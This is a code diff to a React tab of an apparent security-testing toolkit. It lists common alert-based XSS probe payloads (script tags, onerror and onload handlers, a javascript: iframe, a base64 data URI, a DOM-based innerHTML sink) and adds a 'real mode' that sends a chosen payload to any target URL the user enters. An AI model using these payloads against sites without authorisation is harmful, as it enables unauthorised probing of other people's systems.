@@ -5,22 +5,35 @@ import { Textarea } from '@/components/ui/textarea';
 import { Button } from '@/components/ui/button';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { toast } from '@/components/ui/use-toast';
-import { Copy, Check } from 'lucide-react';
+import { Bug, Copy, Check } from 'lucide-react';
+import { executeHackingTool } from '@/utils/osintTools';
 
-const XssPayloadsTab: React.FC = () => {
+interface XssPayloadsTabProps {
+  isRealmode: boolean;
+  isExecuting: boolean;
+  setIsExecuting: (isExecuting: boolean) => void;
+  setToolOutput: (output: string | null) => void;
+}
+
+const XssPayloadsTab: React.FC<XssPayloadsTabProps> = ({ 
+  isRealmode,
+  isExecuting, 
+  setIsExecuting, 
+  setToolOutput 
+}) => {
   const [selectedXssPayload, setSelectedXssPayload] = useState('');
+  const [xssTarget, setXssTarget] = useState('');
   const [copySuccess, setCopySuccess] = useState<string | null>(null);
   
-  // XSS Payloads
   const xssPayloads = {
-    'basic': `<script>alert('XSS')</script>`,
-    'image': `<img src="x" onerror="alert('XSS')">`,
-    'svg': `<svg onload="alert('XSS')">`,
-    'body': `<body onload="alert('XSS')">`,
-    'input': `<input autofocus onfocus="alert('XSS')">`,
-    'iframe': `<iframe src="javascript:alert('XSS')"></iframe>`,
-    'data': `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>`,
-    'data-url': `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
+    'basic-alert': `<script>alert('XSS')</script>`,
+    'image-onerror': `<img src="x" onerror="alert('XSS')">`,
+    'svg-onload': `<svg onload="alert('XSS')">`,
+    'body-onload': `<body onload="alert('XSS')">`,
+    'iframe-src': `<iframe src="javascript:alert('XSS')">`,
+    'input-autofocus': `<input autofocus onfocus="alert('XSS')">`,
+    'data-uri': `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>`,
+    'dom-based': `<script>document.getElementById("demo").innerHTML = location.hash.substring(1);</script>`
   };
   
   const handleCopyToClipboard = (text: string, type: string) => {
@@ -32,6 +45,55 @@ const XssPayloadsTab: React.FC = () => {
         description: `The ${type} has been copied to your clipboard.`,
       });
     });
+  };
+  
+  const executeXssTool = async () => {
+    setIsExecuting(true);
+    setToolOutput(null);
+    
+    try {
+      if (!isRealmode) {
+        setToolOutput('XSS test simulation (real mode disabled)');
+        toast({
+          title: "Simulation Mode",
+          description: "Enable Real Mode to test XSS vulnerabilities",
+        });
+        return;
+      }
+      
+      // Execute XSS vulnerability test using selected payload
+      const payload = selectedXssPayload ? xssPayloads[selectedXssPayload as keyof typeof xssPayloads] : '';
+      
+      const result = await executeHackingTool({
+        tool: 'xss-scanner',
+        options: {
+          url: xssTarget,
+          payload: payload
+        }
+      });
+      
+      toast({
+        title: "XSS Test Executed",
+        description: "Test executed against target",
+      });
+      
+      if (result?.data) {
+        setToolOutput(typeof result.data === 'string' ? result.data : JSON.stringify(result.data, null, 2));
+      } else if (result?.error) {
+        setToolOutput(`Error: ${result.error}`);
+      }
+    } catch (error) {
+      console.error('Tool execution error:', error);
+      setToolOutput(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
+      
+      toast({
+        title: "Execution Failed",
+        description: error instanceof Error ? error.message : "An unknown error occurred",
+        variant: "destructive"
+      });
+    } finally {
+      setIsExecuting(false);
+    }
   };
 
   return (
@@ -79,8 +141,28 @@ const XssPayloadsTab: React.FC = () => {
             </Button>
           </div>
           <p className="text-gray-400 text-xs mt-2">
-            Use this payload to test for Cross-Site Scripting vulnerabilities
+            Use this payload to test for XSS vulnerabilities
           </p>
+          
+          <div className="mt-4">
+            <Label htmlFor="xss-target">Target URL</Label>
+            <Textarea
+              id="xss-target"
+              placeholder="https://example.com/vulnerable-page"
+              value={xssTarget}
+              onChange={(e) => setXssTarget(e.target.value)}
+              className="min-h-16 bg-scanner-dark-alt border-gray-700"
+            />
+          </div>
+          
+          <Button
+            onClick={executeXssTool}
+            disabled={isExecuting || !xssTarget}
+            className="mt-4 bg-scanner-primary"
+          >
+            <Bug className="h-4 w-4 mr-2" />
+            {isExecuting ? "Testing..." : "Test XSS Vulnerability"}
+          </Button>
         </div>
       )}
     </div>
